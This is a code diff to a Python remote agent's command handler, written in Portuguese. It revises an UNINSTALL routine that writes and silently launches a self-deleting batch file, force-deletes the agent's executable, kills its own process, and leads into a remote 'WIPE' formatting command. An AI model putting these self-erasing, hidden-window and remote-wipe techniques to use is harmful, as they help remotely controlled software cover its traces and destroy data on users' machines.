@@ -68,7 +68,10 @@ def handle_command(agent: AegisAgentCore, cmd_data: dict):
         except Exception as e:
             agent.log_gui(f"Erro ao remover autostart: {e}")
             
-        agent.send_command_result("UNINSTALL", "[UNINSTALL_OK] Processo de auto-destruição iniciado nas chaves de registro e binários.", 0)
+        try:
+            agent.send_command_result("UNINSTALL", "[UNINSTALL_OK] Processo de auto-destruição iniciado nas chaves de registro e binários.", 0)
+        except:
+            pass
         
         import tempfile
         import sys
@@ -76,17 +79,26 @@ def handle_command(agent: AegisAgentCore, cmd_data: dict):
         bat_path = os.path.join(tempfile.gettempdir(), "aegis_suicide.bat")
         exe_path = sys.executable
         
-        bat_content = f"""@echo off\ntimeout /t 3 /nobreak > NUL\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"\n"""
+        # O timeout falha quando rodado sem console. O ping-loop ou sleep via powershell eh blindado.
+        bat_content = f"""@echo off
+ping 127.0.0.1 -n 4 > nul
+del /f /q "{exe_path}"
+(goto) 2>nul & del "%~f0"
+"""
         try:
             with open(bat_path, "w") as f:
                 f.write(bat_content)
             
-            subprocess.Popen([bat_path], creationflags=_NO_WINDOW)
+            subprocess.Popen(bat_path, shell=True, creationflags=_NO_WINDOW)
             agent.log_gui("Script suicida engatilhado. Adeus.")
-        except Exception:
-            pass
+        except Exception as e:
+            agent.log_gui(f"Erro ao iniciar bat: {e}")
             
-        os._exit(0)
+        import psutil
+        try:
+            psutil.Process(os.getpid()).kill()
+        except:
+            os._exit(0)
 
     elif cmd_type == "WIPE":
         agent.log_gui("💀 WIPE RECEBIDO! Iniciando formatação...")
